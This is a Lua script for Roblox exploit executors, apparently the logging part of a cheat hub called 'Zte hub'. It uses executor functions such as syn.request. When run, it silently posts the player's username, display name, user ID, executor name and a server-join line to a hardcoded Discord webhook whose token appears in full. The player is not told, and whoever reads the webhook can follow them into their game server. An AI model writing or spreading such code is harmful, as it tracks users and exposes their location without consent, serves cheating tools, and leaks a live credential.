local Http       = game:GetService("HttpService")
local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
local executor   = identifyexecutor() or "idk"

local function sendRequest()
    -- Gather player info
    local player      = game.Players.LocalPlayer
    local displayName = player and player.DisplayName or "Display name not available"
    local userName    = player and player.Name or "Unknown"
    local playerId    = player and player.UserId or 0

    -- Get place/job IDs for the join script
    local placeId = tostring(game.PlaceId)
    local jobId   = tostring(game.JobId)
    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

    -- Build a single payload with two embeds:
    --   1) “Thanks for using the script!” + user info
    --   2) “Join Server Script” embed with the joinScript code block
    local payload = {
        content = "**Thanks for using the script!**",
        embeds = {
            {
                author = {
                    name = "Zte hub Server"
                },
                title = userName .. " | " .. displayName,
                type  = "rich",
                color = tonumber(0x00FF00),  -- Green
                thumbnail = {
                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?"
                          .. "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                },
                fields = {
                    {
                        name   = "Executor:",
                        value  = executor,
                        inline = true
                    },
                },
            },
            {
                title       = "Join Server Script",
                description = "```lua\n" .. joinScript .. "\n```",
                color       = tonumber(0x00FF00),
            }
        }
    }

    return {
        Url     = WebhookUrl,
        Method  = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body    = Http:JSONEncode(payload)
    }
end

-- Send the request via Synapse if available, otherwise fall back to a generic 'request'
if syn then
    syn.request(sendRequest())
else
    local requestFunction = http_request or request or HttpPost or syn and syn.request
    requestFunction(sendRequest())
end
